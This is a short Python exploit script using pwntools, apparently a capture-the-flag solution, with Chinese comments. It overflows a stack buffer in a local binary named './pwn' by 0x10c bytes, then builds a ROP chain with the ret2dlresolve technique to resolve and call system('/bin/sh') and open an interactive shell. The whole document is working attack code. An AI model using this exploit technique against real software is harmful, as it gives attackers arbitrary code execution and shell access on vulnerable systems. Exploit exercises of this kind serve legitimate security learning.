from pwn import *

context.log_level = 'debug'

p = process('./pwn')
elf = ELF('./pwn')

offset = 0x10c # 这里指的溢出的地方到函数的返回地址的偏移量，而不是到ebp（多了ebp的4字节）

dlresolve = Ret2dlresolvePayload(elf, symbol = 'system', args=['/bin/sh\x00'])

# data_addr表示ret2dlresolve的payload存放在什么地址，该参数是Ret2dlresolvePayload类中的一个可选参数。若不主动选择，则会由pwntools挑选一个合适的地址
rop = ROP(elf)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = b'a' * offset + rop.chain()
p.send(payload)
p.send(dlresolve.payload)
print(rop.dump())

p.interactive()